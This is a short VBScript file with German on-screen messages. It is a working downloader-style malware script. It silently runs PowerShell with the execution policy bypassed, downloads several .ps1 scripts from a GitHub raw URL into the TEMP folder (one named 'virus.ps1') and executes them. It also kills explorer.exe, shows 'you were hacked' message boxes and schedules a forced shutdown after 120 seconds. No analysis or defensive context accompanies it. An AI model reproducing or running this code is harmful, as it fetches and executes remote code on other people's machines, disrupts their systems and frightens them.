D i m   o b j S h e l l  
 S e t   o b j S h e l l   =   C r e a t e O b j e c t ( " W S c r i p t . S h e l l " )  
  
 D i m   u r l ,   d o w n l o a d P a t h  
 u r l   =   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m / p a 1 c h e d d / v b s - s c r i p t s / m a i n / 1 . p s 1 "  
 d o w n l o a d P a t h   =   o b j S h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % T E M P % \ b e i s p i e l s k r i p t . p s 1 " )  
  
 o b j S h e l l . R u n   " p o w e r s h e l l . e x e   - E x e c u t i o n P o l i c y   B y p a s s   - C o m m a n d   " " ( N e w - O b j e c t   N e t . W e b C l i e n t ) . D o w n l o a d F i l e ( ' "   &   u r l   &   " ' ,   ' "   &   d o w n l o a d P a t h   &   " ' ) ;   &   ' "   &   d o w n l o a d P a t h   &   " ' " " " ,   0 ,   T r u e  
 W S c r i p t . S l e e p   1 0 0  
  
 u r l   =   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m / p a 1 c h e d d / v b s - s c r i p t s / m a i n / p s s 1 2 3 . p s 1 "  
 d o w n l o a d P a t h   =   o b j S h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % T E M P % \ b e i s p i e l s k r i p t 1 . p s 1 " )  
  
 o b j S h e l l . R u n   " p o w e r s h e l l . e x e   - E x e c u t i o n P o l i c y   B y p a s s   - C o m m a n d   " " ( N e w - O b j e c t   N e t . W e b C l i e n t ) . D o w n l o a d F i l e ( ' "   &   u r l   &   " ' ,   ' "   &   d o w n l o a d P a t h   &   " ' ) ;   &   ' "   &   d o w n l o a d P a t h   &   " ' " " " ,   0 ,   T r u e  
 o b j S h e l l . R u n   " t a s k k i l l   / f   / i m   e x p l o r e r . e x e "  
 W S c r i p t . S l e e p   1 0 0  
 M s g B o x   " H a l l o ,   d u   w u r d e s t   g e h a c k t ! " ,   4 8 ,   " D u   w u r d e s t   g e h a c k t ! " ,   0 ,   T r u e  
 M s g B o x   " W i l l s t   d u   d i e   l e t z t e n   M i n u t e n   d e i n e s   P C s   n u t z e n ? " ,   1 + 4 8 ,   " r u n d l l 3 2   ( S y s t e m s t e u e r u n g ) " ,   0 ,   T r u e  
  
 u r l   =   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m / p a 1 c h e d d / v b s - s c r i p t s / m a i n / n o t i . p s 1 "  
 d o w n l o a d P a t h   =   o b j S h e l l . E x p a n d E n v i r o n m e n t S t r i n g s ( " % T E M P % \ v i r u s . p s 1 " )  
 o b j S h e l l . R u n   " c m d   / c   s t a r t   e x p l o r e r "  
 W S c r i p t . S l e e p   1 0 0  
 o b j S h e l l . R u n   " c m d   / c   s h u t d o w n   - s   - t   1 2 0 " ,   0  
 o b j S h e l l . R u n   " p o w e r s h e l l . e x e   - E x e c u t i o n P o l i c y   B y p a s s   - C o m m a n d   " " ( N e w - O b j e c t   N e t . W e b C l i e n t ) . D o w n l o a d F i l e ( ' "   &   u r l   &   " ' ,   ' "   &   d o w n l o a d P a t h   &   " ' ) ;   &   ' "   &   d o w n l o a d P a t h   &   " ' " " " ,   0 ,   T r u e  
 